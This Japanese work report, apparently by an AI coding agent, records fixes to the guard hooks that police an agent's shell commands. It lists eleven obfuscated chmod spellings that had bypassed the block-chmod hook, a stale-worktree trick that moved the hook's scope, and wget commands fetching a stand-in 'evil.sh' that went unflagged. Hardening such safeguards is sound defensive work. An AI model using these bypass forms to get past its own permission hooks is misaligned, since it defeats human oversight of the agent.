実施した内容と結果

  1. 1

    `block-chmod` の判定軸を「復元」から「難読化の検出」へ変えた ✕問題 根拠: BC-T01 の 11 形が実装前に FAIL / 変異 M4 20 件・M5 19 件

    0035 は最も基本的な "chmod" +x a を含む 11 形を ALLOW にしていた（実測でいずれも chmod が起動する）。原因は 2 つ。復元の列挙が届いていない（_bc_deobfuscate は空のクォート対しか落とさないので "chmod" が戻らない）ことと、前置判定が展開の中身を残す（ch$( : )mod は記号を落としても ch:mod にしかならず、制御方式 5 に到達しない）こと。

    根拠を見る（実行コマンドと出力） 
    $ bash -c '"chmod" --version' | head -1
chmod (GNU coreutils) 8.32

# 0035 の block-chmod に流したときの判定
  "chmod" +x a            ALLOW      ch$( )mod +x a     ALLOW
  'chmod' +x a            ALLOW      ch$( : )mod +x a   ALLOW
  c"h"mod +x a            ALLOW      ch$(echo)mod +x a  ALLOW
  ch"m"od +x a            ALLOW      ch${x:-}mod +x a   ALLOW
  "/usr/bin/chmod" +x a   ALLOW      c${x}hmod +x a     ALLOW
  sudo "chmod" 755 a      ALLOW

# 判定軸を変えた後（0036）
  上記 11 形 + chmod / c\hmod / $CMD / eval / xargs chmod = 16 形すべて DENY

    結論

    復元をやめ、実行体を特定できたかだけを見る形にした。cmdpos の正規化はクォートの範囲を _ に潰し $ を残すので、(1) 実行体に $ かバッククォートがある (2) 実行体がすべて _ (3) 実行体に _ があり生のコマンド文字列にその実行体がそのまま現れない、のいずれかなら「特定できない」とする。未知の表記も同じ経路で捕まる。代償は過剰拒否で、対照を BC-T02 に 11 形置いた。

  2. 2

    `__hc_is_worktree_of` の片方向照合で作業ツリーが移る ✕問題 根拠: HK-T18 に 3 assert / 変異 M3 2 件

    分岐 (b) は <root>/.git/worktrees/*/gitdir の中身が候補の .git と一致するかだけを見ていた。git worktree add の後に prune を忘れた登録が残っていると、無承認で書ける wip/tmp/ 配下に同名ディレクトリと .claude/ を置いて cwd をそこにするだけで HOOK_WORKTREE が移り、作業中チケットが 0 枚になる。

    根拠を見る（実行コマンドと出力） 
    # stale な登録を残したまま候補側に .claude だけ置く
$ cat <root>/.git/worktrees/wt/gitdir
<root>/wip/tmp/wt/.git          # 指す先の .git はもう無い
$ ls <root>/wip/tmp/wt
.claude/                        # 後から置いただけ

0035: HOOK_WORKTREE=<root>/wip/tmp/wt  → 作業中チケット 0 枚
0036: HOOK_WORKTREE=<root>            → 作業中チケット 1 枚

    結論

    分岐を双方向にすると候補側の .git を必ず読むことになり、分岐 (a) と同じ検査になる。残して二重に書くより消すほうが穴が減ると判断し、(b) を削除した。ホットパスから worktrees/*/ のグロブ走査も消えた。

  3. 3

    `wget -o -` で本体の出力先が消える ✕問題 根拠: HK-T15 に 7 assert / 変異 M1 3 件

    _sc_web_add_out は値が - なら種類を問わず dash_o=1 を立てていた。wget の -o / --output-file / --append-output はログなので、- でも本体は URL の basename に落ちる。既定の _ が消え、wget -o - http://example.com/evil.sh が web として素通りしていた。

    根拠を見る（実行コマンドと出力） 
    wtargets() { cmdpos_parse "$1"; scope_classify 0 >/dev/null; printf '%s' "$SC_TARGETS"; }

                                        0035    0036
wget -o - http://x/evil.sh              (空)    _
wget --output-file=- http://x/evil.sh   (空)    _
wget --append-output - http://x/evil.sh (空)    _
wget -O - http://x/evil.sh              (空)    (空)   ← 本体が標準出力。正しい
curl -o - http://x/a                    (空)    (空)   ← curl の -o は本体

    結論

    「本体の出力先か」を $2 で受け、dash_o は本体側のときだけ立てる形にした。

  4. 4

    `__hc_cap_json_field` が上限を 3 バイト超える △注意 根拠: HK-T17 に 10 assert / 変異 M10 3 件

    二分探索で「上限に収まる最大長」を決めた後に …（3 バイト）を足していた。上限 512 に対して 515 バイト。

    根拠を見る（実行コマンドと出力） 
    $ __hc_cap_json_field '{"target":"<900 文字>"}' target 512
0035: 値 515 バイト（上限 512）
0036: 値 512 バイト

上限 2（`…` より小さい）のとき: 印を付けずに 2 バイトへ収める

    結論

    … の分を先に引いてから探索する形にした。上限が … より小さいときは印を付けない（超えないことを優先）。

  5. 5

    `__hc_winpath` の負の添字は bash 4.3 以降 △注意 根拠: 変異 M9 13 件（挙動は変えていない）

    ${out[-1]} / unset 'out[-1]' は bash 4.3 以降。cmdpos.sh は 4.3 未満を明示的に縮退させており、4.2 以下は想定環境に含まれる。そこでは set -euo pipefail のフックごと落ちる。

    根拠を見る（実行コマンドと出力） 
    $ grep -n 'BASH_VERSINFO' .claude/hooks/lib/cmdpos.sh
344:  if (( BASH_VERSINFO[0] < 4 || (BASH_VERSINFO[0] == 4 && BASH_VERSINFO[1] < 3) )) ...
        CP_DEGRADED=1; return 0     # cmdpos は縮退するが __hc_winpath は縮退しない

$ grep -rn '\[-1\]' .claude/hooks/lib/hook-common.sh
（0036 では 0 件。コメント中の言及のみ）

    結論

    長さを自分で持って添字を正にした。挙動は変えていない（変異 M9 が 13 件で .. の畳みを固定している）。

想定と異なった点

計画時の見込み実際どう扱ったか
難読化の除去は列挙を足せば追いつく3 巡続けて破れた。0035 は最も基本的な "chmod" を通していた判定軸を「復元」から「特定できたか」に変えた
分岐 (b) は双方向にすれば直る双方向にすると分岐 (a) と同じ検査になる（登録側から探しても候補の .git を読むことになる）分岐ごと削除した
(( x )) && y は set -e で呼び出し元を落とす&& の左辺は set -e の対象外で落ちない（最小の再現で確認）可読性のため if に開いたが、事実と違うコメントは書かなかった
変異させて 0 件なら、その行は要らない空白の除去は難読化除去と重なっていただけで、上限（4096 バイト）超えの長さでは空白の除去でしか拾えないそのケースを BC-T01 に足して 1 件にした
変異テストのランナーは背景で回してよい背景ジョブの復元と前景の編集が競合し、実装に変異が残ったまま 3 回テストを回した。さらに変異後の 54/20 を基準値と気付かず「検出力あり」と読みかけた前景で 1 件ずつ回し、復元のたびに基準値へ戻ることをスクリプト自身に検査させる形にした
subprocess から回したテストの数字は使えるjq が PATH に無く、変異なしでも 6/68 だったテストは Bash ツールと同じ経路で回す
